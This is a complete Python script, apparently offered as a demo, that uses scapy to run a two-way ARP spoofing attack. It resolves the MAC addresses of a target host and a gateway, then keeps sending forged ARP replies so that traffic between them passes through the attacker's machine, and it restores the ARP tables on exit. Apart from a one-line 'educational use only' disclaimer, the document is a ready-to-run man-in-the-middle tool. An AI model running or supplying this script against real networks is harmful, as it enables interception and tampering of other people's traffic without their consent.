#!/usr/bin/env python3

# ARP Spoofing Demo Script
# Educational use only. Test on networks you own or have explicit permission to analyze.

import sys
import time
from scapy.all import ARP, Ether, send, srp

def get_mac(ip):
    
    resp, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip), timeout=2, verbose=False)
    for _, rcv in resp:
        return rcv.hwsrc
    return None

def poison(target_ip, target_mac, spoof_ip):
    """Send an ARP response to trick target into associating our MAC with spoof_ip."""
    send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip), verbose=False)

def restore(target_ip, target_mac, real_ip, real_mac):
    """Restore the ARP table by sending the correct mapping."""
    send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=real_ip, hwsrc=real_mac), count=4, verbose=False)

def main():
    if len(sys.argv) != 4:
        print(f"Usage: {sys.argv[0]} <target_ip> <gateway_ip> <interface>")
        sys.exit(1)

    target_ip, gateway_ip, interface = sys.argv[1], sys.argv[2], sys.argv[3]

    from scapy.all import conf
    conf.iface = interface

    target_mac = get_mac(target_ip)
    gateway_mac = get_mac(gateway_ip)

    if not target_mac or not gateway_mac:
        print("[-] Could not resolve MACs. Exiting.")
        sys.exit(1)

    print(f"[+] Target: {target_ip} ({target_mac}), Gateway: {gateway_ip} ({gateway_mac})")
    print("[*] ARP poisoning in progress... Press Ctrl+C to restore and exit.")

    try:
        while True:
            poison(target_ip, target_mac, gateway_ip)   # Target thinks we are the gateway
            poison(gateway_ip, gateway_mac, target_ip) # Gateway thinks we are the target
            time.sleep(2)
    except KeyboardInterrupt:
        print("\n[!] Restoring ARP tables...")
        restore(target_ip, target_mac, gateway_ip, gateway_mac)
        restore(gateway_ip, gateway_mac, target_ip, target_mac)
        print("[+] ARP tables restored. Exiting.")

if __name__ == "__main__":
    main()
